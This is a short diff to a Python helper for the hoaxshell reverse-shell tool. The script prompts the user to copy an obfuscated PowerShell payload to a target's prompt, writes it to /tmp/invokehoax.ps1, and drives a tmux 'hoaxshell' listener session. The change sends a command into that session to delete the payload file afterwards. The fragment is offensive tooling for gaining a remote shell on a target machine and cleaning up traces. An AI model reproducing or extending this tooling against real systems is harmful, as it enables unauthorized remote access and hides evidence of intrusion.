@@ -106,7 +106,7 @@ def main():
     print("\n" + Fore.RED + "Copy payload to target powershell prompt" + Style.RESET_ALL)
     os.system("cat /tmp/obfuscated.ps1 | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,3})*)?[mGK]//g' > /tmp/invokehoax.ps1")
     input("\nPress enter to continue")
-    os.system("sudo tmux send-keys -t hoaxshell ENTER")
+    os.system("sudo tmux send-keys -t hoaxshell 'rm 'invokehoax.ps1'' ENTER")
 
     #Hoaxshell tmux session
     print("Entering tmux session... \n" + Fore.RED + "\nType 'exit' to exit session\n" + Style.RESET_ALL)
